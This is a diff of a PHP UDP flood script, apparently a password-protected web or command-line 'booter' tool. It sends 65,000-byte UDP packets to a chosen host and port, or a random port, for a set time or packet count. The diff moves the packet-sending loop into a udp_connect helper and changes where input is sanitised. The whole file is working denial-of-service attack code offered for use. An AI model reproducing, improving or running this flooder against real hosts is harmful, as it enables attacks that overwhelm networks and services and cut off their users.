@@ -1,60 +1,69 @@
 <?php
+function udp_connect($h,$p,$ps){
+	$ret = false;
+	$out = str_repeat("0", $ps);
+	$fp = fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
+	if(!$fp){
+		echo "$errstr ($errno)<br />\n";
+		$ret = false;
+	}else{
+			fwrite($fp, $out);
+			fclose($fp);
+			$ret = true;
+	}
+	return $ret;
+}
+
 $cli=false;
 
 if(isset($argv)) {
+		// CLI
     parse_str(implode('&', array_slice($argv, 1)), $_GET);
     $cli=true;
+}else{
+		// Server
+		foreach($_GET as &$G){
+			$G=htmlspecialchars($G, ENT_QUOTES, 'UTF-8');
+			echo $G;
+		}
 }
 
 if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset($_GET['pass'])||$cli==true)){
 	
 	// If executed from CLI no password
 	if($cli==false){
-		$pass = htmlspecialchars($_GET['pass'], ENT_QUOTES, 'UTF-8');
+		$pass = $_GET['pass'];
 		if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo "Wrong password!"; exit();}
 	}
 	
 	$packets = 0; 
-	$host = htmlspecialchars($_GET['host'], ENT_QUOTES, 'UTF-8');
+	$host = $_GET['host'];
+	$port = $_GET['port'];
+	$port = (isset($port) && is_numeric($port) && strlen($port) > 0) ? $port : rand(1,65535);
 	
 	$packet_size = 65000;
-	$out = str_repeat("0", $packet_size);
 	
 	if(isset($_GET['time'])){
-		$exec_time = htmlspecialchars($_GET['time'], ENT_QUOTES, 'UTF-8'); 
+		$exec_time = $_GET['time']; 
 		$max_time = time()+$exec_time; 
 		
 		while(time() < $max_time){
 				$packets++;
-				$port = (isset($_GET['port']) && strlen($_GET['port']) > 0) ?  htmlspecialchars($_GET['port'], ENT_QUOTES, 'UTF-8') : rand(1,65535);
-				$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 30);
-				if(!$fp){
-					echo "$errstr ($errno)<br />\n";
-				}else{
-						if($cli){
-							echo "Sending packet #".$packets."...\n";
-						}
-						fwrite($fp, $out);
-						fclose($fp);
+				$result = udp_connect($host,$port,$packet_size);
+				if($result && $cli){
+					echo "Sending packet #".$packets."...\n";
 				}
 		}
 	}
 	elseif(isset($_GET['packet'])){
-		$max_packet = htmlspecialchars($_GET['packet'], ENT_QUOTES, 'UTF-8');
+		$max_packet = $_GET['packet'];
 		$start_time=time();
 		
 		while($packets < $max_packet){
 				$packets++;
-				$port = (isset($_GET['port']) && strlen($_GET['port']) > 0) ?  htmlspecialchars($_GET['port'], ENT_QUOTES, 'UTF-8') : rand(1,65535);
-				$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 30);
-				if(!$fp){
-					echo "$errstr ($errno)<br />\n";
-				}else{
-						if($cli){
-							echo "Sending packet #".$packets."...\n";
-						}
-						fwrite($fp, $out);
-						fclose($fp);
+				$result = udp_connect($host,$port,$packet_size);
+				if($result && $cli){
+					echo "Sending packet #".$packets."...\n";
 				}
 		}
 		$exec_time = time() - $start_time;
